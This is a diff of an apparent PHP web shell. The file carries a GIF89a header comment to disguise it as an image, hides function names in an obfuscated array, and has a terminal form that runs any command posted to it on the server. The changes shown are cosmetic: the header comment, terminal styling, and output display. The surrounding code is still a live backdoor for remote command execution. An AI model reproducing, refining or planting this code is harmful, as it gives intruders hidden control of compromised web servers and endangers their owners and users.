@@ -1,6 +1,4 @@
-<!-- 
-    GIF89;a 
--->
+<!-- GIF89;a -->
 <?php
 
 $Array = [
@@ -376,8 +374,10 @@ if (!empty($_GET['download'])) {
         }
 
         .output-terminal {
-            width: 100%;
+            width: 99.5%;
             height: 100%;
+            color: black;
+            background-color: white;
         }
 
         .terminal-input {
@@ -675,7 +675,7 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
                         <input type="submit" value=">" name="submit-terminal" class="terminal-submit">
                     </form>
                     <?php if (isset($_POST['submit-terminal'])) :  ?>
-                        <pre class="output-terminal"><?= htmlspecialchars($fungsi[14]($_POST['terminal'] . " 2>&1")); ?></pre>
+                        <textarea class="output-terminal" disabled><?= htmlspecialchars($fungsi[14]($_POST['terminal'] . " 2>&1")); ?></textarea>
                     <?php endif; ?>
                 </div>
             </div>
